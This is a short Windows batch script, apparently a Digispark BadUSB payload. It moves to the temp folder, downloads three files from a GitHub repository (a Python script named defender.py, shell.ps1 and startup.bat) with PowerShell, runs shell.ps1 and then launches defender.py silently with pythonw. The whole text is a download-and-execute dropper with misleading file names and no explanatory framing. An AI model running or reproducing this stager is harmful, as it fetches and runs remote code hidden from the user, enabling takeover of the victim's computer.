cd %TEMP%
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/defender.py -OutFile defender.py
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/shell.ps1 -OutFile shell.ps1
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/startup.bat -OutFile startup.bat
powershell .\shell.ps1
cls
pythonw defender.py
exit






